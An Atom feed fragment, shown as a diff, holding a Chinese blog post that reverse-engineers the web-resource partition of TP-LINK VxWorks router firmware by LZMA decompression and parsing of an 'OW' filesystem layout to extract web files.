+      <updated>2014-05-31T02:17:42Z</updated>
+  </entry>
+
+  <entry>
+      <link href="https://blog.leexiaolan.tk/tp-link-vxworks-router-firmware-update-file-format-part-2.html"/>
+      <id>https://blog.leexiaolan.tk/entry/tp-link-vxworks-router-firmware-update-file-format-part-2</id>
+      <title>TP-LINK VxWorks系统路由器固件升级文件格式(二)</title>
+      <content type="html"><![CDATA[
+      &lt;p&gt;在&lt;a href=&quot;/tp-link-vxworks-router-firmware-update-file-format-part-1.html&quot;&gt;TP-LINK VxWorks系统路由器固件升级文件格式(一)&lt;/a&gt;中，我们从固件升级文件中提取出了各个分区文件，其中包含名为web-res的分区文件，不过其中的内容还是无法理解。所以这次将对web-res分区文件内容深入探究。&lt;/p&gt;
+&lt;p&gt;首先使用&lt;a href=&quot;http://binwalk.org&quot;&gt;binwalk&lt;/a&gt;对其进行扫描，没有发现任何文件特征，binwalk无能为力。&lt;/p&gt;
+&lt;pre class=&quot;brush: plain;fontsize: 100; first-line: 1;&quot;&gt;tplink-vxworks-based-firmware.git$ ls -l web-res
+-rw------- 1 root root 522361 Jan 26 13:54 web-res
+tplink-vxworks-based-firmware.git$ hd web-res | head
+00000000  00 07 f8 70 00 00 00 00  00 5d 00 80 00 00 91 36  |...p.....].....6|
+00000010  30 00 00 00 00 00 00 27  95 e8 30 10 07 00 06 10  |0......&#39;..0.....|
+00000020  58 12 85 15 4c b3 bb a9  7a f1 0e 92 a9 25 17 fb  |X...L...z....%..|
+00000030  3a 61 ca cb e0 47 a2 fa  e0 20 29 c1 73 1c 6c 47  |:a...G... ).s.lG|
+00000040  e9 58 aa 08 cf 7b a7 b9  df 45 e3 31 a9 9e c5 85  |.X...{...E.1....|
+00000050  98 99 2d 7c de 3b be 5e  dd 0d 74 54 c1 63 5c 06  |..-|.;.^..tT.c\.|
+00000060  34 49 3f 0e 23 84 9d 6c  0e 13 47 c5 10 12 e1 57  |4I?.#..l..G....W|
+00000070  23 bc 9d cc 0d de d6 41  4a 65 b6 a7 f8 d5 54 af  |#......AJe....T.|
+00000080  1f 76 35 9d 4b 00 cc d4  fb 42 18 2c 6a 96 2d e5  |.v5.K....B.,j.-.|
+00000090  08 59 1f bb cc 71 fa 26  cb d0 d8 86 88 6e af 8c  |.Y...q.&amp;amp;.....n..|
+&lt;/pre&gt;
+&lt;p&gt;仔细观察后发现，如果将文件的头四个字节当做大端的32位整型来看，&lt;code&gt;0x0007f870 == 522352&lt;/code&gt;，同文件大小&lt;code&gt;522361&lt;/code&gt;相比，仅仅相差9。于是可以假定其值代表后面数据的大小，文件由9个字节的文件头和实际数据组成。但后面数据的格式还是未知。&lt;/p&gt;
+&lt;p&gt;从名字web-res来看，里面存储的内容应该是一些web相关的资源文件，html，css和js等，这些文件都是纯文本。但数据完全看不出任何合理的字符串，估计是被加密或压缩过的。加密的可能性一般不大，可以先考虑压缩。数据的第一个字节&lt;code&gt;0x5D&lt;/code&gt;看起来像默认属性的lzma压缩流，用lzma解压来碰碰运气吧。&lt;/p&gt;
+&lt;pre class=&quot;brush: plain;fontsize: 100; first-line: 1;&quot;&gt;tplink-vxworks-based-firmware.git$ dd if=web-res of=web-res.dat.lzma bs=1 skip=9
+522352+0 records in
+522352+0 records out
+522352 bytes (522 kB) copied, 0.901332 s, 580 kB/s
+tplink-vxworks-based-firmware.git$ lzmainfo web-res.dat.lzma
+
+web-res.dat.lzma
+Uncompressed size:             3 MB (3159697 bytes)
+Dictionary size:               0 MB (2^15 bytes)
+Literal context bits (lc):     3
+Literal pos bits (lp):         0
+Number of pos bits (pb):       2
+
+tplink-vxworks-based-firmware.git$ lzma -d -v web-res.dat.lzma
+web-res.dat.lzma (1/1)
+ 99.9 %     510.1 KiB / 3,085.6 KiB = 0.165
+lzma: web-res.dat.lzma: Compressed data is corrupt
+ 99.9 %     510.1 KiB / 3,085.6 KiB = 0.165
+&lt;/pre&gt;
+&lt;p&gt;尝试用lzma命令行工具解压失败了，但看起来99.9%的数据已经解压成功了，深入检查后发现，原来是正常的压缩数据后，还有部分尾数据，不属于lzma压缩流，所以导致lzma命令失败。知道了原因就很容易解决啦。使用python的lzma包来解压并忽略尾数据，成功解压。源代码&lt;a href=&quot;https://github.com/LeeXiaolan/tplink-vxworks-based-firmware/blob/20e9eb03e78a10965559e406c1d1c5becae31cd3/decompress-web-res.py&quot;&gt;decompress-web-res.py&lt;/a&gt;。&lt;/p&gt;
+&lt;pre class=&quot;brush: plain;fontsize: 100; first-line: 1;&quot;&gt;tplink-vxworks-based-firmware.git$ ./decompress-web-res.py web-res
+Decompressed data length: 3159697
+Unused data length: 1
+Decompressed data saved to &quot;web-res.decompressed&quot;.
+tplink-vxworks-based-firmware.git$ hd web-res.decompressed | head
+00000000  4f 57 4f 57 4f 57 4f 57  4f 57 4f 57 4f 57 4f 57  |OWOWOWOWOWOWOWOW|
+*
+00000020  00 00 00 01 00 00 00 f8  2f 72 63 5f 66 69 6c 65  |......../rc_file|
+00000030  73 79 73 2f 64 6f 63 2f  64 79 6e 61 66 6f 72 6d  |sys/doc/dynaform|
+00000040  2f 63 6f 6d 6d 6f 6e 2e  6a 73 00 00 00 00 00 00  |/common.js......|
+00000050  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
+00000060  00 00 00 00 00 00 00 00  00 00 bb 07 00 00 49 c8  |..............I.|
+00000070  00 00 00 00 2f 72 63 5f  66 69 6c 65 73 79 73 2f  |..../rc_filesys/|
+00000080  64 6f 63 2f 64 79 6e 61  66 6f 72 6d 2f 6d 61 69  |doc/dynaform/mai|
+00000090  6e 2e 63 73 73 00 00 00  00 00 00 00 00 00 00 00  |n.css...........|
+&lt;/pre&gt;
+&lt;p&gt;解压后的文件中，已经可以看到有意义的字符串了。开头部分的字符串看起来像是文件名，如何从中提取这些文件呢？文件开头的&amp;ldquo;OWOWOWOW...&amp;rdquo;像是magic string，google之，发现这篇文章&lt;a href=&quot;http://www.devttys0.com/2011/06/mystery-file-system/&quot;&gt;Mystery File System&lt;/a&gt;和其UPDATE #3中引用的&lt;a href=&quot;http://blog.ioactive.com/2012/02/solving-little-mystery.html&quot;&gt;Solving a Little Mystery&lt;/a&gt;。综合上述两篇文章中的信息，web-res.decompressed中的文件系统（姑且称之为ow2fs，相对Mystery File System中的owfs而言）的header和entry可以如此定义（大端字节序）：&lt;/p&gt;
+&lt;pre class=&quot;brush: plain;fontsize: 100; first-line: 1;&quot;&gt;struct ow2fs_header{
+  char magic[32];          // &#39;OWOWOWOWOW...&#39;
+  uint32_t unknown;
+  uint32_t file_count;
+}
+struct ow2fs_entry{
+  char file_path[0x40];
+  uint32_t file_size;
+  uint32_t file_offset;
+  uint32_t unknown;
+}
+&lt;/pre&gt;
+&lt;p&gt;ow2fs与owfs相比，有如下差异：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;magic字符串为大写&amp;ldquo;OW&amp;rdquo;，而非小写。&lt;/li&gt;
+&lt;li&gt;header少了一个uint32_t的字段。&lt;/li&gt;
+&lt;li&gt;entry中的文件名变成了文件路径，可能包含文件夹，最大长度变大成64。&lt;/li&gt;
+&lt;li&gt;entry中多了一个uint32_t的未知字段，其值均为0。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;知道了ow2fs的结构，我们就可以写段程序，提取其中的所有文件了，源代码&lt;a href=&quot;https://github.com/LeeXiaolan/tplink-vxworks-based-firmware/blob/f290fcab53985028f06291d7bffc38c72d2f399b/unow2fs.py&quot;&gt;unow2fs&lt;/a&gt;。&lt;/p&gt;
+&lt;pre class=&quot;brush: plain;fontsize: 100; first-line: 1;&quot;&gt;tplink-vxworks-based-firmware.git$ ./unow2fs.py web-res.decompressed out | head
+Extract 248 files into out...
+/rc_filesys/doc/dynaform/common.js (47879) at 0x49c8...Successful
+/rc_filesys/doc/dynaform/main.css (25599) at 0x104d0...Successful
+/rc_filesys/doc/dynaform/menu.js (13551) at 0x168d0...Successful
+/rc_filesys/doc/dynaform/extra.js (57444) at 0x19dc0...Successful
+/rc_filesys/doc/frames/product.htm (881) at 0x27e24...Successful
+/rc_filesys/doc/localization/str_menu.js (2238) at 0x28198...Successful
+/rc_filesys/doc/localization/char_set.js (0) at 0x28a58...Successful
+/rc_filesys/doc/dynaform/tab.js (15495) at 0x28a58...Successful
+/rc_filesys/doc/dynaform/bwCtrlVerify.js (59979) at 0x2c6e0...Successful
+&lt;/pre&gt;
+&lt;p&gt;查看这些提取的js，css和htm文件，都完好无损。至此，web-res的结构我们已经完全分析清楚了。&lt;/p&gt;
+      
+                <h4>相关阅读：</h4>
+                  <ul>
+                
+                  <li><a href="https://blog.leexiaolan.tk/post-pwn-huawei-hg8120c-ont.html">PWN华为HG8120C光猫之后</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/pwn-huawei-hg8120c-ont-via-maintenance-tool-part-2.html">PWN华为HG8120C光猫（二）</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/pwn-huawei-hg8120c-ont-via-uart-part-1.html">PWN华为HG8120C光猫（一）</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/pwn-huawei-hg8120c-ont-upgrade-pack-format-part-3.html">PWN华为HG8120C光猫（三）</a></li>
+                
+                  <li><a href="https://blog.leexiaolan.tk/tp-link-vxworks-router-firmware-update-file-format-part-3.html">TP-LINK VxWorks系统路由器固件升级文件格式(三)</a></li>
+                
+                </ul>
+                
+                <p>本文网址:<a href="https://blog.leexiaolan.tk/tp-link-vxworks-router-firmware-update-file-format-part-2.html">https://blog.leexiaolan.tk/tp-link-vxworks-router-firmware-update-file-format-part-2.html</a></p>
+
+      ]]></content>
+      <author>
+          <name>李晓岚</name>
+      </author>
+      <updated>2014-03-15T08:53:20Z</updated>
+  </entry>
+
+</feed>
